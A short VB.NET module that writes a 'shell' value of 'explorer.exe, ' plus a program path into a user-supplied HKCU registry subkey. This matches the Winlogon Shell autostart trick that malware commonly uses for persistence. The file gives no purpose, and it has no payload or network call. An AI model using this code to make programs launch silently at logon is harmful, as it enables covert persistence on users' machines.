Imports Microsoft.Win32
Module StartupRegistryModule
    Public Sub Set_registry(ByVal reglocal As String, ByVal path As String)
        Dim regKey As RegistryKey
        regKey = Registry.CurrentUser.OpenSubKey(reglocal, True)
        regKey.SetValue("shell", "explorer.exe, " & """" & path & """")
        regKey.Close()
    End Sub

End Module
